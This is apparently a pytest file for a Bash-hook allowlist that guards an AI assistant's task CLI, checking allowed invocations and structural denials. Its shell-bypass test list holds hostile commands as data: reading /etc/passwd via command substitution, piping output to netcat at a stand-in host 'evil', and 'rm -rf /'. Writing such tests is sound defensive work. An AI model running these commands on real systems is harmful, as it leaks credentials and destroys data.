"""Phase 6 / commit 5 — Bash hook allowlist for the task CLI.

Two layers compose:
  1. `_validate_python_invocation` enforces the `tools/` prefix and no
     `..` traversal (inherited from phase 3).
  2. `_validate_task_argv` enforces structural shape: subcommand
     whitelist, flag whitelist per subcommand, no duplicate flags
     (wave-2 B-W2-5 lesson), size/range caps on free-form values.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from assistant.bridge.hooks import check_bash_command


@pytest.fixture
def project_root(tmp_path: Path) -> Path:
    (tmp_path / "tools" / "task").mkdir(parents=True)
    (tmp_path / "tools" / "task" / "main.py").write_text("# stub\n")
    return tmp_path


# ---------------------------------------------------------------- ALLOW

ALLOW_CASES = [
    'python tools/task/main.py spawn --kind general --task "write a poem"',
    'python tools/task/main.py spawn --kind researcher --task "find cves" --callback-chat-id 42',
    "python tools/task/main.py list",
    "python tools/task/main.py list --status started",
    "python tools/task/main.py list --kind general --limit 5",
    "python tools/task/main.py status 42",
    "python tools/task/main.py cancel 7",
    "python tools/task/main.py wait 3",
    "python tools/task/main.py wait 3 --timeout-s 120",
]


@pytest.mark.parametrize("cmd", ALLOW_CASES)
def test_allowlist_allow(cmd: str, project_root: Path) -> None:
    reason = check_bash_command(cmd, project_root)
    assert reason is None, f"{cmd!r}: expected ALLOW, got DENY: {reason!r}"


# ---------------------------------------------------------------- DENY (shell bypass)

SHELL_BYPASS_CASES = [
    'python tools/task/main.py spawn --kind general --task "$(cat /etc/passwd)"',
    'python tools/task/main.py spawn --kind general --task "`whoami`"',
    "python tools/task/main.py list | nc evil 1",
    "python tools/task/main.py list > /tmp/leak",
    "python tools/task/main.py list ; rm -rf /",
]


@pytest.mark.parametrize("cmd", SHELL_BYPASS_CASES)
def test_deny_shell_bypass(cmd: str, project_root: Path) -> None:
    reason = check_bash_command(cmd, project_root)
    assert reason is not None, f"{cmd!r}: shell meta must be denied"


# ---------------------------------------------------------------- DENY (structural)


def test_deny_unknown_subcommand(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py destroy 42", project_root)
    assert reason is not None
    assert "task subcommand" in reason


def test_deny_spawn_unknown_kind(project_root: Path) -> None:
    reason = check_bash_command(
        'python tools/task/main.py spawn --kind ninja --task "x"', project_root
    )
    assert reason is not None
    assert "--kind" in reason


def test_deny_spawn_missing_required_flag(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py spawn --kind general", project_root)
    assert reason is not None
    assert "missing required flag" in reason


def test_deny_spawn_duplicate_flag(project_root: Path) -> None:
    reason = check_bash_command(
        "python tools/task/main.py spawn --kind general --task a --task b",
        project_root,
    )
    assert reason is not None
    assert "duplicate" in reason


def test_deny_spawn_oversized_task(project_root: Path) -> None:
    big = "x" * 5000
    reason = check_bash_command(
        f'python tools/task/main.py spawn --kind general --task "{big}"',
        project_root,
    )
    assert reason is not None
    assert "exceeds" in reason


def test_deny_spawn_non_integer_callback(project_root: Path) -> None:
    reason = check_bash_command(
        "python tools/task/main.py spawn --kind general --task x --callback-chat-id abc",
        project_root,
    )
    assert reason is not None
    assert "integer" in reason


def test_deny_status_non_integer_id(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py status abc", project_root)
    assert reason is not None


def test_deny_status_multiple_positionals(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py status 1 2", project_root)
    assert reason is not None


def test_deny_wait_timeout_out_of_range(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py wait 3 --timeout-s 999999", project_root)
    assert reason is not None
    assert "timeout" in reason


def test_deny_wait_unknown_flag(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py wait 3 --poll-interval 10", project_root)
    assert reason is not None


def test_deny_list_unknown_status(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py list --status bogus", project_root)
    assert reason is not None


def test_deny_list_limit_out_of_range(project_root: Path) -> None:
    reason = check_bash_command("python tools/task/main.py list --limit 10000", project_root)
    assert reason is not None


def test_deny_list_duplicate_flag(project_root: Path) -> None:
    reason = check_bash_command(
        "python tools/task/main.py list --status started --status failed",
        project_root,
    )
    assert reason is not None
